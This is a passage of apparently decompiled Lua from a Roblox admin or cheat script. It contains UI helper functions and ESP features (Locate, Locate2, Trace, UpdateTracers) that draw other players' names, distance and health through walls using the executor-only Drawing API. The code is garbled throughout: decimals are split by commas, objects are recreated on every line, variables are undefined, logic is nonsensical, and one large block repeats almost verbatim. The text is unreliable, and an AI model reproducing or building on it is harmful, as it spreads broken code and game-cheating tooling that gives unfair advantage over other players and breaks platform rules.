              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Draggable(UI.ChatLogs)
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
